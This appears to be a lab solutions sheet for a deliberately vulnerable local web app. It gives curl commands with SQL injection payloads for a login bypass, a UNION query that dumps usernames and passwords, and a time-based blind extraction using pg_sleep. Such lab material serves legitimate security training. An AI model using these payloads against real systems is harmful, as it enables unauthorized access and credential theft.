# Lab Solutions

## SQLi Authentication Bypass

```bash
curl --location 'http://localhost:8080/api/users/login' \
--header 'Content-Type: application/json' \
--data '{
    "username": "admin'\'' --",
    "password": "wrongpassword"
}'
```

## Union Based SQLi

```bash
curl --location 'http://localhost:8080/api/users/admin'\'' UNION SELECT NULL, username, password, NULL FROM users --'
```

## Time Based Blind SQLi

```bash
curl --location 'http://localhost:8080/api/users/admin'\''%3B SELECT CASE WHEN (SUBSTR(password,1,1)='\''a'\'') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='\''admin'\'' --'```
```

Repeat until you get the whole password.

